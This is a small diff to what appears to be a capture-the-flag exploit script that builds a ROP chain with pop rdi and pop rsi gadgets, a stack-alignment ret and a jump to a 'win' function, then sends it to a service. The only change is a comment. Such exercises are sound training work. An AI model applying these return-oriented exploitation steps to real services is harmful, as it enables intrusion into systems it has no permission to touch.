@@ -65,7 +65,7 @@ payload += p64(pop_rdi)    # put the next value on the stack into the rdi regist
 payload += p64(0xdeadbeef) # value to put into the rdi register
 payload += p64(pop_rsi)    # put the next value on the stack into the rsi register
 payload += p64(0xcafebabe) # value to put into the the rsi register
-payload += p64(ret)        # align the stack to 16 bytes
+payload += p64(ret)        # align the stack to 16 bytes (IMPORTANT)
 payload += p64(WIN)        # call win
 
 conn.sendlineafter(b"data: ",payload)
